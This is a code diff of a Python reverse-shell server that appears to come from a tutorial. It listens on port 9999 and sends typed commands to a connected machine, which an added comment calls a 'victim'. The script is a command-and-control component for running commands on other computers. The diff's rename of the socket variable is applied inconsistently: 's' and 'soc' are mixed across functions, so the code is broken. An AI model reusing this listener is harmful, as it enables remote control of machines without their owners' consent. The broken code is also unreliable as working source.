@@ -2,7 +2,7 @@ import socket
 import sys
 
 
-# Create a Socket
+# Create a Socket ( connect two computers)
 def create_socket():
     try:
         global host
@@ -10,29 +10,29 @@ def create_socket():
         global s
         host = ""
         port = 9999
-        s = socket.socket()
+        soc = socket.socket()
 
     except socket.error as msg:
-        print("Socket creation error: " + str(msg))
+        print("Socket creation error: " + str(msg) + "\n" + "Retrying...")
 
 
-# Binding to listen for connections
+# Binding the socket and listening for connections
 def bind_socket():
     try:
         global host
         global port
-        global s
+        global soc
         print("Binding the Port: " + str(port))
 
-        s.bind((host, port))
-        s.listen(5)
+        soc.bind((host, port))
+        soc.listen(5)
 
     except socket.error as msg:
         print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
         bind_socket()
 
 
-# Establish connection with a client
+# Establish connection with a client (socket must be listening)
 
 def socket_accept():
     conn, address = s.accept()
@@ -40,13 +40,13 @@ def socket_accept():
     send_commands(conn)
     conn.close()
 
-# Send commands to client
+# Send commands to client/victim or a friend
 def send_commands(conn):
     while True:
         cmd = input()
         if cmd == 'quit':
             conn.close()
-            s.close()
+            soc.close()
             sys.exit()
         if len(str.encode(cmd)) > 0:
             conn.send(str.encode(cmd))
